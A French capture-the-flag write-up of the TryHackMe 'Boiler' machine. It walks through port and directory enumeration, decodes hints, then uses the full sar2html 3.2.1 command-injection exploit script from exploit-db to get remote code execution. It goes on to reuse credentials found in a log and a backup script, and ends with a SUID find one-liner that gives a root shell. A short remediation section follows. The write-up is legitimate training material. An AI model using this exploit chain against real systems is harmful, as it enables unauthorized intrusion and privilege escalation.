# ÉNUMÉRATION

## NMAP
 - Full Ports scan : `nmap -sV -p- -sC -oA nmap/scan_fullPort 10.10.2.72`
	```bash
	# Nmap 7.93 scan initiated Tue Mar  7 09:52:18 2023 as: nmap -sV -p- -sC -oA nmap/scan_fullPort 10.10.2.72
	Nmap scan report for 10.10.2.72
	Host is up (0.037s latency).
	Not shown: 65531 closed tcp ports (reset)
	PORT      STATE SERVICE VERSION
	21/tcp    open  ftp     vsftpd 3.0.3
	|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
	| ftp-syst: 
	|   STAT: 
	| FTP server status:
	|      Connected to ::ffff:10.18.48.143
	|      Logged in as ftp
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      At session startup, client count was 4
	|      vsFTPd 3.0.3 - secure, fast, stable
	|_End of status
	80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-title: Apache2 Ubuntu Default Page: It works
	| http-robots.txt: 1 disallowed entry 
	|_/
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
	|_http-title: Site doesnt have a title (text/html; Charset=iso-8859-1).
	55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 e3abe1392d95eb135516d6ce8df911e5 (RSA)
	|   256 aedef2bbb78a00702074567625c0df38 (ECDSA)
	|_  256 252583f2a7758aa046b2127004685ccb (ED25519)
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

	```

- FTP : `nmap -sV -p21 -sC -A 10.10.2.72`

	```bash
	nmap -sV -p21 -sC -A 10.10.2.72 -oA nmap/scan_ftp
	Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 09:37 UTC
	Nmap scan report for 10.10.2.72
	Host is up (0.032s latency).

	PORT   STATE SERVICE VERSION
	21/tcp open  ftp     vsftpd 3.0.3
	| ftp-syst: 
	|   STAT: 
	| FTP server status:
	|      Connected to ::ffff:10.18.48.143
	|      Logged in as ftp
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      At session startup, client count was 3
	|      vsFTPd 3.0.3 - secure, fast, stable
	|_End of status
	|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
	No exact OS matches for host (test conditions non-ideal).
	Network Distance: 2 hops
	Service Info: OS: Unix

	TRACEROUTE (using port 443/tcp)
	HOP RTT      ADDRESS
	1   32.13 ms 10.18.0.1
	2   32.15 ms 10.10.2.72
	```


## PORT 21

Connection au port 21 avec **ftp**:

```bash
$ ftp anonymous@boiler.thm
Connected to boiler.thm.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

```bash
ftp> ls -la
229 Entering Extended Passive Mode (|||43036|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
```

```bash
ftp> more .info.txt
```

```bash
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

Le texte a été chiffré à l'aide du chiffrement de César, qui est une forme de chiffrement par substitution dans lequel chaque lettre est décalée de trois positions dans l'alphabet.
[Chiffrement par décalage](https://fr.wikipedia.org/wiki/Chiffrement_par_d%C3%A9calage)

On a donc deux solutions :

- utiliser un script python
    
    ```python3
    def decrypt_cesar_cipher(ciphertext, shift):
        plaintext = ""
        for char in ciphertext:
            if char.isalpha():
                ascii_offset = 65 if char.isupper() else 97
                plaintext += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)
            else:
                plaintext += char
        return plaintext
    
    ciphertext = "Tecd gkxdon dy coo sp iye psxn sd. Vyv. Bowowlob: Oxewobkdsyx sc dro uoi!"
    
    for shift in range(11):
        plaintext = decrypt_cesar_cipher(ciphertext, shift)
        print("Shift {}: {}".format(shift, plaintext))
    
    ```
    
    > Ce script Python définit une fonction decrypt\_cesar\_cipher qui prend en entrée un texte chiffré avec le chiffrement de César et un décalage, et renvoie le texte déchiffré.
    > La fonction utilise une boucle pour parcourir chaque caractère du texte chiffré. Si le caractère est une lettre de l'alphabet, la fonction calcule le décalage à appliquer en soustrayant l'indice ASCII de la lettre par l'indice ASCII de la lettre A (pour les majuscules) ou de la lettre a (pour les minuscules), puis en soustrayant le décalage. Le caractère déchiffré est ensuite ajouté au texte déchiffré. Si le caractère n'est pas une lettre, il est simplement ajouté au texte déchiffré tel quel.
    > Ensuite, le script définit une chaîne de caractères chiffrée appelée ciphertext, qui est déchiffrée en utilisant la fonction decrypt\_cesar\_cipher pour chaque décalage allant de 0 à 10. Pour chaque décalage, le texte déchiffré est affiché sur la sortie standard avec le décalage correspondant.
    
    ```bash
    $ python3 cesarDecoder.py
    Shift 0: Tecd gkxdon dy coo sp iye psxn sd. Vyv. Bowowlob: Oxewobkdsyx sc dro uoi!
    Shift 1: Sdbc fjwcnm cx bnn ro hxd orwm rc. Uxu. Anvnvkna: Nwdvnajcrxw rb cqn tnh!
    Shift 2: Rcab eivbml bw amm qn gwc nqvl qb. Twt. Zmumujmz: Mvcumzibqwv qa bpm smg!
    Shift 3: Qbza dhualk av zll pm fvb mpuk pa. Svs. Yltltily: Lubtlyhapvu pz aol rlf!
    Shift 4: Payz cgtzkj zu ykk ol eua lotj oz. Rur. Xkskshkx: Ktaskxgzout oy znk qke!
    Shift 5: Ozxy bfsyji yt xjj nk dtz knsi ny. Qtq. Wjrjrgjw: Jszrjwfynts nx ymj pjd!
    Shift 6: Nywx aerxih xs wii mj csy jmrh mx. Psp. Viqiqfiv: Iryqivexmsr mw xli oic!
    Shift 7: Mxvw zdqwhg wr vhh li brx ilqg lw. Oro. Uhphpehu: Hqxphudwlrq lv wkh nhb!
    Shift 8: Lwuv ycpvgf vq ugg kh aqw hkpf kv. Nqn. Tgogodgt: Gpwogtcvkqp ku vjg mga!
    Shift 9: Kvtu xboufe up tff jg zpv gjoe ju. Mpm. Sfnfncfs: Fovnfsbujpo jt uif lfz!
    Shift 10: Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
    ```
    
- [dcode.fr](https://www.dcode.fr/chiffre-cesar)
    ![dcode_fr_chiffre-cesar.png](https://github.com/RawMain121/writeups/blob/main/tryHackMe/room/Boiler/_resources/dcode_fr_chiffre-cesar.png)
    

Le texte était donc chiffré avec un décalage de 10.

* * *
## PORT 80
### GOBUSTER boiler.thm

```bash
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://boiler.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
2023/03/08 04:00:54 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 290]
/.php                 (Status: 403) [Size: 289]
/index.html           (Status: 200) [Size: 11321]
/manual               (Status: 301) [Size: 309] [--> http://boiler.thm/manual/]
/joomla               (Status: 301) [Size: 309] [--> http://boiler.thm/joomla/]
/.php                 (Status: 403) [Size: 289]
/.html                (Status: 403) [Size: 290]
/server-status        (Status: 403) [Size: 298]
...
```

### GOBUSTER boiler.thm/joomla/

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://boiler.thm/joomla/ 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://boiler.thm/joomla/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/08 04:50:00 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 301]
/.htpasswd            (Status: 403) [Size: 301]
/_archive             (Status: 301) [Size: 318] [--> http://boiler.thm/joomla/_archive/]
/_database            (Status: 301) [Size: 319] [--> http://boiler.thm/joomla/_database/]
/_files               (Status: 301) [Size: 316] [--> http://boiler.thm/joomla/_files/]
/_test                (Status: 301) [Size: 315] [--> http://boiler.thm/joomla/_test/]
/~www                 (Status: 301) [Size: 314] [--> http://boiler.thm/joomla/~www/]
/administrator        (Status: 301) [Size: 323] [--> http://boiler.thm/joomla/administrator/]
/bin                  (Status: 301) [Size: 313] [--> http://boiler.thm/joomla/bin/]
/build                (Status: 301) [Size: 315] [--> http://boiler.thm/joomla/build/]
/cache                (Status: 301) [Size: 315] [--> http://boiler.thm/joomla/cache/]
/components           (Status: 301) [Size: 320] [--> http://boiler.thm/joomla/components/]
/images               (Status: 301) [Size: 316] [--> http://boiler.thm/joomla/images/]
/includes             (Status: 301) [Size: 318] [--> http://boiler.thm/joomla/includes/]
/index.php            (Status: 200) [Size: 12474]
/installation         (Status: 301) [Size: 322] [--> http://boiler.thm/joomla/installation/]
/language             (Status: 301) [Size: 318] [--> http://boiler.thm/joomla/language/]
/layouts              (Status: 301) [Size: 317] [--> http://boiler.thm/joomla/layouts/]
/libraries            (Status: 301) [Size: 319] [--> http://boiler.thm/joomla/libraries/]
/media                (Status: 301) [Size: 315] [--> http://boiler.thm/joomla/media/]
/modules              (Status: 301) [Size: 317] [--> http://boiler.thm/joomla/modules/]
/plugins              (Status: 301) [Size: 317] [--> http://boiler.thm/joomla/plugins/]
/templates            (Status: 301) [Size: 319] [--> http://boiler.thm/joomla/templates/]
/tests                (Status: 301) [Size: 315] [--> http://boiler.thm/joomla/tests/]
/tmp                  (Status: 301) [Size: 313] [--> http://boiler.thm/joomla/tmp/]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/03/08 04:50:19 Finished
===============================================================


```

- http://boiler.thm/joomla/
    ![HTTP_joomla.png](https://github.com/RawMain121/writeups/blob/main/tryHackMe/room/Boiler/_resources/HTTP_joomla.png)
    Wappalyser nous indique que Le CMS du site est **Joomla**, on va donc se renseigner sur ce CMS:
    - Identification du CMS a l'aide de l'outil **CMSEEK**:
        
        ```bash
        $ python3 cmseek.py --url http://boiler.thm/joomla/
        ```
        
        ```bash
        [i] Updating CMSeeK result index...
        [x] Result directory does not exist!
        There was an error while creating result index! Some features might not work as intended. 		Press [ENTER] to continue:
        
        ```
        
        ```bash
        [+]  Deep Scan Results  [+] 
        
        [✔] Target: http://boiler.thm/joomla
        [✔] Detected CMS: Joomla
        [✔] CMS URL: https://joomla.org
        [✔] Joomla Version: 3.9.12-dev
        [✔] Readme file: http://boiler.thm/joomla/README.txt
        [✔] Admin URL: http://boiler.thm/joomlaadministrator
        
        
        [✔] Open directories: 4
        [*] Open directory url: 
           [>] http://boiler.thm/joomlaadministrator/modules
           [>] http://boiler.thm/joomlaadministrator/templates
           [>] http://boiler.thm/joomlaadministrator/components
           [>] http://boiler.thm/joomlaimages/banners
        
        
        [!] No core vulnerabilities detected!
        
        
        
         CMSeeK says ~ adieu
        
        ```
        Pas de vulnerabilité trouvé pour le moment.
        


	Continons de rechercher des informations dans les pages trouvé par gobuster:

- http://boiler.thm/joomla/_file
    
    ```bash
    $ curl http://boiler.thm/joomla/_files/
    <!DOCTYPE html>
    <html>
            <head>
                    <title>Woops</title>
            </head>
            <body>
                    <div align=center><h1 style=color:red>VjJodmNITnBaU0JrWVdsemVRbz0K</h1></div>
            </body>
    </html>
    ```
    
    ```bash
    $ echo "VjJodmNITnBaU0JrWVdsemVRbz0K" | base64 -d
    V2hvcHNpZSBkYWlzeQo=
    $ echo "V2hvcHNpZSBkYWlzeQo=" | base64 -d
    Whopsie daisy
    
    ```
    
    Fausse piste...
    
- http://boiler.thm/joomla/_test/
    ![HTTP_boiler-joomla_test.png](https://github.com/RawMain121/writeups/blob/main/tryHackMe/room/Boiler/_resources/HTTP_boiler-joomla_test.png)
    
    - sar2html
        
        ```bash
        $ searchsploit 'sar2html'    
        -------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
        Exploit Title                                                                                                                                    |  Path
        -------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
        sar2html 3.2.1 - 'plot' Remote Code Execution                                                                                                     | php/webapps/49344.py
        Sar2HTML 3.2.1 - Remote Command Execution                                                                                                         | php/webapps/47204.txt
        -------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
        Shellcodes: No Results
        Papers: No Results 
        ```
        
# EXPLOITATION

```bash
$ cat /usr/share/exploitdb/exploits/php/webapps/47204.txt   
# Exploit Title: sar2html Remote Code Execution
# Date: 01/08/2019
# Exploit Author: Furkan KAYAPINAR
# Vendor Homepage:https://github.com/cemtan/sar2html
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Centos 7

In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute
the command you entered. After command injection press "select # host" then your command's
output will appear bottom side of the scroll screen
```

Cette note écrite par *Furkan KAYAPINAR* permet d'exécuter du code à distance sur un serveur en envoyant une commande dans l'URL de la page web.

L'url en question est : `http://<ipaddr>/index.php?plot=;<command-here>`

On pourrait le faire manuellement dans le navigateur internet, burp, curl, ... mais un exploit existe (écris par *Musyoka Ian*), il est même disponible dans **exploit-db** :

```python
GNU nano 7.2                                                                          49344.py                                                                                    
# Exploit Title: sar2html 3.2.1 - 'plot' Remote Code Execution
# Date: 27-12-2020
# Exploit Author: Musyoka Ian
# Vendor Homepage:https://github.com/cemtan/sar2html
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Ubuntu 18.04.1

#!/usr/bin/env python3

import requests
import re
from cmd import Cmd

url = input("Enter The url => ")

class Terminal(Cmd):
    prompt = "Command => "
    def default(self, args):
        exploiter(args)

def exploiter(cmd):
    global url
    sess = requests.session()
    output = sess.get(f"{url}/index.php?plot=;{cmd}")
    try:
        out = re.findall("<option value=(.*?)>", output.text)
    except:
        print ("Error!!")
    for ouut in out:
        if "There is no defined host..." not in ouut:
            if "null selected" not in ouut:
                if "selected" not in ouut:
                    print (ouut)
    print ()

if __name__ == ("__main__"):
    terminal = Terminal()
    terminal.cmdloop()
```

`$ cp /usr/share/exploitdb/exploits/php/webapps/49344.py tryHackMe/room/boiler`

```bash
$ python3 49344.py 
Enter The url => http://boiler.thm/joomla/_test
Command => id
HPUX
Linux
SunOS
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

L'exploit fonctionne !

On va essayer quelques commandes :

```bash
Command => ls -lsa
HPUX
Linux
SunOS
total 124
 4 drwxr-xr-x  3 www-data www-data  4096 Aug 22  2019 .
 4 drwxr-xr-x 25 www-data www-data  4096 Aug 22  2019 ..
56 -rwxr-xr-x  1 www-data www-data 53430 Aug 22  2019 index.php
 4 -rwxr-xr-x  1 www-data www-data   716 Aug 21  2019 log.txt
52 -rwxr-xr-x  1 www-data www-data 53165 Mar 19  2019 sar2html
 4 drwxr-xr-x  3 www-data www-data  4096 Aug 22  2019 sarFILE

Command => cat log.txt
HPUX
Linux
SunOS
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: <basterd_password>
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
```

On vient de trouver le mot de passe de connexion en ssh de l'utilisateur **'basterd'.**

Essayons de nous connecter en ssh avec ce compte (lors du scan de nmap, nous avons vu que le port **55007** était ouvert et utilise le protocool **ssh**) :

```bash
$ ssh basterd@boiler.thm -p 55007
The authenticity of host '[boiler.thm]:55007 ([10.10.79.83]:55007)' can't be established.
ED25519 key fingerprint is SHA256:GhS3mY+uTmthQeOzwxRCFZHv1MN2hrYkdao9HJvi8lk.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:6: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[boiler.thm]:55007' (ED25519) to the list of known hosts.
basterd@boiler.thm's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.


Last login: Wed Mar  8 09:53:50 2023 from 10.18.48.143
```

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'  
basterd@Vulnerable:~$ id
uid=1001(basterd) gid=1001(basterd) groups=1001(basterd)
basterd@Vulnerable:~$
```

Nous avons un shell fonctionnel.

```bash
basterd@Vulnerable:~$ ls -lsa
total 16
4 drwxr-x--- 3 basterd basterd 4096 Aug 22  2019 .
4 drwxr-xr-x 4 root    root    4096 Aug 22  2019 ..
4 -rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh
0 -rw------- 1 basterd basterd    0 Aug 22  2019 .bash_history
4 drwx------ 2 basterd basterd 4096 Aug 22  2019 .cache
```

```bash
basterd@Vulnerable:~$ cat backup.sh 
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#<stoner_mot_de_passe>

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
             echo "Begining copy of" $i  >> $LOG
             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
             echo $i "completed" >> $LOG

                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                    rm $SOURCE/$i
                    echo $i "removed" >> $LOG
                    echo "####################" >> $LOG
                                else
                                        echo "Copy not complete" >> $LOG
                                        exit 0
                fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi
```

Ce script Bash copie tous les fichiers contenant le mot "data" dans le répertoire local "/home/stoner" vers un répertoire de sauvegarde distant "/usr/local/backup" sur une machine distante identifiée par l'adresse IP "1.2.3.4". Le script crée un nouveau répertoire dans le répertoire de sauvegarde distant avec la date actuelle dans le format YY.MM.DD pour stocker les fichiers copiés.

Ensuite, pour chaque fichier contenant le mot "data" dans le répertoire local, le script affiche un message de début de copie, copie le fichier vers le répertoire de sauvegarde distant et affiche un message de fin de copie. Ensuite, il vérifie si le fichier copié existe dans le répertoire de sauvegarde distant. Si c'est le cas, il supprime le fichier d'origine local et affiche un message de suppression de fichier, sinon il affiche un message indiquant que la copie n'est pas terminée et quitte le script.

Enfin, si le répertoire local "/home/stoner" n'existe pas, le script affiche un message indiquant que le répertoire n'est pas présent et quitte le script. Le script enregistre également les messages dans un fichier journal situé dans "/home/stoner/bck.log".

Il y a plusieurs informations sensibles dans ce script **backup.sh**.

Le nom d'utilisateur et le mot de passe de l'utilisateur sont stockés dans les variables "USER=stoner" et "<stoner_mot_de_passe>". Ces informations sont intéréssante car elle permettent d'accéder à la machine distante en utilisant les informations d'identification de l'utilisateur.

Connectons nous en ssh avec l'utilisateur stoner :

```bash
$ ssh stoner@boiler.thm -p 55007
stoner@boiler.thm's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
```

Nous avons un shell avec l'utilisateur **stoner**.

```bash
stoner@Vulnerable:~$ ls -lsa
total 20
4 drwxr-x--- 4 stoner stoner 4096 Mar  8 12:42 .
4 drwxr-xr-x 4 root   root   4096 Aug 22  2019 ..
4 drwx------ 2 stoner stoner 4096 Mar  8 12:42 .cache
4 drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
4 -rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
stoner@Vulnerable:~$ cat .secret 
<secret>
```

Nous venons de trouver le secret. 

Continuons notre énumération manuel 

```bash
$ find / -perm -u=s 2>/dev/null
/bin/su
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping6
/bin/ping
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/apache2/suexec-custom
/usr/lib/apache2/suexec-pristine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgidmap
/usr/bin/find
/usr/bin/at
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newuidmap
```

Cette commande va chercher tous les fichiers sur le système de fichiers qui ont un bit "setuid" activé pour l'utilisateur propriétaire du fichier, ce qui signifie que lorsque le fichier est exécuté,il s'exécutera avec les privilèges de l'utilisateur propriétaire du fichier plutôt qu'avec les privilèges de l'utilisateur qui l'exécute.

Plus précisément, la commande "**find**" est utilisée pour rechercher des fichiers à partir d'un emplacement spécifié ("/" dans ce cas, ce qui signifie que la recherche commence à partir de la racine du système de fichiers).

L'option "-perm -u=s" spécifie que l'on cherche des fichiers dont le bit **setuid** est activé pour l'utilisateur propriétaire du fichier. L'option "2>/dev/null" redirige les messages d'erreur standard (stderr) vers le périphérique null, afin de ne pas afficher les erreurs liées aux permissions insuffisantes.

Nous allons utiliser /usr/bin/find puisque aprés une recherche sur [](https://gtfobins.github.io/gtfobins/find/#suid "gtfobins find suid")

il existe une méhode pour monté en privilège avec /usr/bin/find (source: [gtfobins](https://gtfobins.github.io/gtfobins/find/#suid "gtfobins/find/#suid"))

![find_SUID.png](https://github.com/RawMain121/writeups/blob/main/tryHackMe/room/Boiler/_resources/find_SUID.png)

On va utiliser cette méthode :

```bash
stoner@Vulnerable:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
# whoami
root
```

Bien joué, nous voilà **root** de la machine ! 

```bash
# cat /root/root.txt
<Flag>
```

* * *


# FIX

- **backup.sh** et **log.txt**

	Il est important de protéger ces informations sensibles en utilisant des mesures de sécurité appropriées, telles que la limitation des 		droits d'accès aux fichiers et aux répertoires. Ces informations sont sensibles car elles permettent à une personne mal intentionnée 	d'accéder à la machine distante en utilisant les informations d'identification de l'utilisateur.

- **SAR2HTML**

	SAR2HTML est un outil open-source qui convertit les données du système collectées par SAR (System Activity Reporter) en un format HTML facilement lisible. SAR2HTML version 3.2.1 est une version ancienne de l'outil, qui pourrait potentiellement présenter des vulnérabilités de sécurité.

	Si vous utilisez SAR2HTML 3.2.1, il est recommandé de mettre à jour vers la dernière version disponible pour résoudre les éventuelles vulnérabilités.

- **SUID**
	Vous pouvez limiter les privilèges de l'utilisateur ayant le droit d'exécuter /usr/bin/find en ne lui donnant pas les droits SUID pour cette commande. Si l'utilisateur a besoin d'exécuter cette commande avec des privilèges élevés, vous pouvez utiliser des mécanismes de contrôle d'accès basés sur des rôles ou des groupes pour limiter les utilisateurs qui peuvent exécuter cette commande avec des privilèges élevés.

---
